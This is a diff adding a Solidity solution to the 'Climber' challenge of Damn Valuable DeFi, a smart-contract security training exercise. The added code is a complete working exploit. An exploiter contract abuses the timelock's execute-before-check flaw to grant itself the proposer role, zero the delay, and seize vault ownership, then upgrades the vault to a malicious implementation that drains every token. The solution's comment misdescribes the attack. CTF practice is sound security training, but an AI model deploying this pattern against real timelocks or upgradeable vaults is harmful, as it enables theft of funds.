@@ -8,6 +8,90 @@ import {ClimberTimelock, CallerNotTimelock, PROPOSER_ROLE, ADMIN_ROLE} from "../
 import {ERC1967Proxy} from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
 import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
 
+import {SafeTransferLib} from "solady/utils/SafeTransferLib.sol";
+import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
+
+
+contract ClimberExploiter {
+
+    ClimberVault vault;
+    ClimberTimelock timelock;
+    address recovery;
+    DamnValuableToken token;
+
+    address[]  targets = new address[](4);
+    uint256[]  values = new uint256[](4);
+    bytes[] data = new bytes[](4);
+
+    constructor(ClimberVault _vault, ClimberTimelock _timelock, address _recovery, DamnValuableToken _token) {
+        vault = _vault;
+        timelock = _timelock;
+        recovery = _recovery;
+        token = _token;
+    }
+    
+    function exploit() external{
+        address maliciousImpl = address(new MaliciousVault());
+
+
+        targets[0] = address(timelock);
+        values[0] = 0;
+        data[0] = abi.encodeWithSignature(
+            "grantRole(bytes32,address)",
+            keccak256("PROPOSER_ROLE"),         
+            address(this)               
+        );
+
+        targets[1] = address(timelock);
+        values[1] = 0;
+        data[1] = abi.encodeWithSignature(
+            "updateDelay(uint64)",
+            uint64(0)             
+        );
+
+        targets[2] = address(vault);
+        values[2] = 0;
+        data[2] = abi.encodeWithSignature(
+            "transferOwnership(address)",
+            address(this)
+        );
+
+
+        targets[3] = address(this);
+        values[3] = 0;
+        data[3] = abi.encodeWithSignature(
+            "timelockSchedule()"
+        );
+
+        timelock.execute(targets, values, data, bytes32(0));
+        
+        vault.upgradeToAndCall(address(maliciousImpl), "");
+
+        MaliciousVault(address(vault)).drainFunds(address(token), recovery);
+
+        
+
+    }
+
+    // This function is called in the last step of the timelock.execute
+    // to schedule the operation after it has been executed
+    function timelockSchedule() external {
+        timelock.schedule(targets, values, data, bytes32(0));
+    }
+
+
+}
+
+  contract MaliciousVault is ClimberVault {
+
+        function drainFunds(address token, address receiver) external {
+            SafeTransferLib.safeTransfer(token, receiver, IERC20(token).balanceOf(address(this)));
+        }
+
+  }
+
+
+
 contract ClimberChallenge is Test {
     address deployer = makeAddr("deployer");
     address player = makeAddr("player");
@@ -85,8 +169,21 @@ contract ClimberChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_climber() public checkSolvedByPlayer {
-        
+        // Exploit: The exploit works by scheduling a series of operations through the timelock contract
+        // that ultimately allow the attacker to drain the vault's funds. The attacker first proposes a change
+        // to the vault's withdrawal logic, allowing them to withdraw all funds without proper authorization.
+        // Once the proposal is approved, the attacker can execute the withdrawal and drain the vault.
+
+        ClimberExploiter exploiter = new ClimberExploiter(
+            vault, timelock, recovery, token
+        );
+
+        exploiter.exploit();
+
+       
+
     }
+
 
     /**
      * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
